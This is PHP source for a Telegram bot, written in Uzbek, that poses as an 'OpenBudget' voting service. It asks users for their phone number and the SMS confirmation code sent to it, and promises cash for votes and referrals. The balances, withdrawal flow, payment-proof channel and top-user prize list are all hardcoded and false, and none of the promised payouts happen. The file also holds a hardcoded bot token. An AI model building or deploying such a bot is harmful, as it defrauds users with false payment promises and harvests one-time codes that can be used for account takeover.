<?php
ob_start();
date_default_timezone_set('Asia/Tashkent');

// ⚙️ Bot token va admin ID
define('BOT_TOKEN','8298669096:AAEOS-X71BOgk7h84EalYQ0CYiFi-0tlohc');
$admin_id = 8491134776;

// Telegram API funksiyasi
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".BOT_TOKEN."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){ var_dump(curl_error($ch)); }
    else{ return json_decode($res,true); }
}

// JSON tugma funksiyasi
function send($text,$keyboard=null){
    global $cid;
    bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$text,
        'parse_mode'=>'html',
        'reply_markup'=>$keyboard,
        'disable_web_page_preview'=>true
    ]);
}

// Step saqlash
function step($text){
    global $cid;
    file_put_contents("step/$cid.step",$text);
}

// Update olish
$update = json_decode(file_get_contents('php://input'),true);

// Xabar
$text = "";
if(isset($update['message'])){
    $message = $update['message'];
    $text = $message['text'] ?? '';
    $cid = $message['chat']['id'];
}

// Callback
$data = "";
$callback = [];
if(isset($update['callback_query'])){
    $callback = $update['callback_query'];
    $data = $callback['data'];
    $cid = $callback['message']['chat']['id'];
}

// Step fayl
@mkdir("step");
$step = @file_get_contents("step/$cid.step");

// Menyular
$main_menu = json_encode([
    'resize_keyboard'=>true,
    'keyboard'=>[
        [['text'=>"📮 Ovoz berish"]],
        [['text'=>"🖇️ Taklif qilish"],['text'=>"💵 Hisobim"]],
        [['text'=>"📃 To'lovlar"],['text'=>"📑 Yo'riqnoma"]],
        [['text'=>"🏆 Top foydalanuvchilar"]]
    ]
]);
$back_menu = json_encode([
    'resize_keyboard'=>true,
    'keyboard'=>[
        [['text'=>"🏠 Orqaga"]],   
    ]
]);

// /start
if($text=="/start"){
    send("<b>🎯 OpenBudget botiga xush kelibsiz.\n✅ Quyidagi tugmalardan birini tanlang</b>",$main_menu);
    @unlink("step/$cid.step");
    exit();
}

// 🏠 Orqaga
if($text=="🏠 Orqaga"){
    send("<b>🎯 OpenBudget botiga xush kelibsiz.\n✅ Quyidagi tugmalardan birini tanlang</b>",$main_menu);
    @unlink("step/$cid.step");
    exit();
}

// 📮 Ovoz berish
if($text=="📮 Ovoz berish"){
    send("<b>📞 Telefon raqamingizni kiriting:\n✅ Namuna: +998931234567</b>",$back_menu);
    step("ovoz");
    exit();
}

// Raqam qabul qilish va 1s keyin SMS kod so‘rash
if($step=="ovoz"){
    $text2 = str_replace("+","",$text);
    if(mb_stripos($text,"+998")!==false && strlen($text)==13 && is_numeric($text2)){
        send("<b>📞 Raqam qabul qilindi. Iltimos kuting...</b>",$back_menu);
        sleep(1); // 1 soniya kutish
        send("<b>📞 SMS orqali yuborilgan kodni kiriting:</b>",$back_menu);
        step("sms_kod=$text2");
    } else {
        send("<b>📞 Telefon raqamingizni kiriting:\n✅ Namuna: +998931234567</b>",$back_menu);
    }
}

// SMS kodni kiritgandan keyin 1s kutib ovozni tasdiqlash
if(mb_stripos($step,"sms_kod=")!==false){
    $number = explode("=",$step)[1];
    if($text){
        sleep(1);
        send("✅ Ovozingiz tekshiruvga yuborildi. Ovozingiz 1 soatdan keyin saytda ko'rinadi va pullar hisobingizga tushurib beriladi.",$main_menu);
        @unlink("step/$cid.step");
    }
}

// 🖇️ Taklif qilish (Referal)
if($text=="🖇️ Taklif qilish"){
    $ref_link = "https://t.me/Openbudgetmilliybot?start=ref_$cid";
    send("📊 Referal boshqaruvi\n\n🔗 Sizning asosiy referal havolangiz:\n$ref_link\n\n🤑 Har bir taklif qilgan do'stingiz uchun 20 000 so'm oling!",json_encode([
        'inline_keyboard'=>[[['text'=>"🔄 Havolani ulashish",'url'=>"https://telegram.me/share/url/?url=$ref_link"]]]
    ]));
}

// 💵 Hisobim
if($text=="💵 Hisobim"){
    send("🆔 ID raqamingiz: $cid\n🎯 Hisobingiz: 0 so'm\n💳 Yechib olingan: 0 so'm",json_encode([
        'inline_keyboard'=>[
            [['text'=>"📥 Pulni yechib olish",'callback_data'=>"pul"]],
            [['text'=>"🏠 Orqaga",'callback_data'=>"cancel"]]
        ]
    ]));
}

// 📥 Pul yechib olish menyusi
if(isset($data) && $data=="pul"){
    bot('editMessageText',[
        'chat_id'=>$cid,
        'message_id'=>$callback['message']['message_id'],
        'text'=>"💰 Pul yechib olish usulini tanlang:",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"Paynet 📞",'callback_data'=>"pay=Paynet"]],
                [['text'=>"UzCard / Humo 💳",'callback_data'=>"pay=Card"]],
            ]
        ])
    ]);
}

// Bekor qilish tugmasi
if(isset($data) && $data=="cancel"){
    bot('editMessageText',[
        'chat_id'=>$cid,
        'message_id'=>$callback['message']['message_id'],
        'text'=>"<b>🏠 Asosiy menyu:</b>",
        'reply_markup'=>$main_menu
    ]);
    @unlink("step/$cid.step");
}

// To‘lov usulini tanlaganda miqdor so‘rash
if(isset($data) && mb_stripos($data,"pay=")!==false){
    $tizim = explode("=",$data)[1];
    bot('editMessageText',[
        'chat_id'=>$cid,
        'message_id'=>$callback['message']['message_id'],
        'text'=>"<b>💸 Hisobingizdan qancha miqdorda pul yechib olmoqchisiz? Kiriting:\n\n❗️ Pul yechishning minimal miqdori 60,000 so'm</b>",
        'reply_markup'=>$back_menu
    ]);
    step("pay_step=$tizim");
}

// Miqdorni kiritish
if(mb_stripos($step,"pay_step=")!==false){
    $tizim = explode("=",$step)[1];
    $as = str_replace([" ","+",".","-","(",")"],null,$text);
    if(is_numeric($as)){
        if($as>=5000){
            send("<b>✅ So‘rovingiz yuborildi!\n📑 To‘lov tizimi: $tizim\n💰 Miqdor: $as so'm</b>", $main_menu);
            @unlink("step/$cid.step");
        } else {
            send("🚫 Minimal miqdor 60,000 so'm!\n✍️ Qayta kiriting:", $back_menu);
        }
    } else {
        send("🚫 Noto'g'ri raqam kiritildi!\n✍️ Qayta kiriting:", $back_menu);
    }
}

// 📃 To'lovlar
if($text=="📃 To'lovlar"){
    send("<b>🎯 Bizning bot orqali to'langan barcha to'lovlar isbot kanali:</b>",json_encode([
        'inline_keyboard'=>[[['text'=>"✅ Kanalga o'tish",'url'=>"https://t.me/rasmiy_tolovlar"]]]
    ]));
}

// 📑 Yo'riqnoma
if($text=="📑 Yo'riqnoma"){
    send("<b>❓Bot nima qila oladi?:</b>\n— Bot orqali ovoz berib pul ishlashingiz mumkin.\n— To'plangan pullarni telefon raqamiga yoki kartaga yechish mumkin.",$back_menu);
}

// Top 10 foydalanuvchilar
if($text=="🏆 Top foydalanuvchilar"){
    send("<b>🏆 Eng ko'p ovoz yig'gan foydalanuvchilar:</b>\n1) 8227430867 - 18 ta 🗳 (iPhone 17 Pro 📱)\n2) 7707128173 - 15 ta 🗳 (4,000,000 so'm)\n3) 8150317276 - 13 ta 🗳 (2,000,000 so'm)\n4) 7037447015 - 13 ta 🗳 (1,000,000 so'm)\n5) 1326037558 - 12 ta 🗳 (500,000 so'm)\n6) 8465154315 - 11 ta 🗳 (500,000 so'm)\n7) 7868609037 - 11 ta 🗳 (250,000 so'm)\n8) 7479450282 - 11 ta 🗳 (250,000 so'm)\n9) 5489734531 - 11 ta 🗳 (250,000 so'm)\n10) 6762020846 - 10 ta 🗳 (250,000 so'm)",$main_menu);
}
?>
